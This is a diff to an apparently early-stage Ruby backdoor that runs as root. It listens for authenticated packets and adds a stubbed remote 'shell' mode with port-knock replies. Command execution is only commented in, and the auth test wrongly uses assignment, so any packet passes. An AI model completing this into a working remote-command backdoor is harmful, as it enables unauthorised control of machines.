@@ -18,7 +18,8 @@
 --
 -- PROGRAMMERS:   Chris Wood - chriswood.ca@gmail.com
 -- 
--- NOTES:         notes might go here
+-- NOTES:         weird buffer for capture, client needs to send 2 commmands
+--                before server receives both at the same time
 ---------------------------------------------------------------------------------------
 =end
 
@@ -114,6 +115,14 @@ def start_listen_server
         cmds = payload.split(' ')
         if cmds[0] = AUTH_STRING
           case cmds[1]
+          when MODE_SHELL
+            cmd = cmds[2..-1].join(' ')
+            puts cmd
+            #execute cmd here
+            #get resp
+            #start other junk for knock and send back
+          when MODE_WATCH
+          end
         else
           next #not auth, skip
         end
@@ -159,10 +168,9 @@ end
 raise 'Must run as root' unless Process.uid == 0
 load_config_file
 begin
-  #listen_thread = Thread.new { start_listen_server }
-  #listen_thread.join
-  start_listen_server
+  listen_thread = Thread.new { start_listen_server }
+  listen_thread.join
 rescue Interrupt # Catch the interrupt(ctrl c) and kill the thread
-  #Thread.kill(listen_thread)
+  Thread.kill(listen_thread)
   exit 0
 end
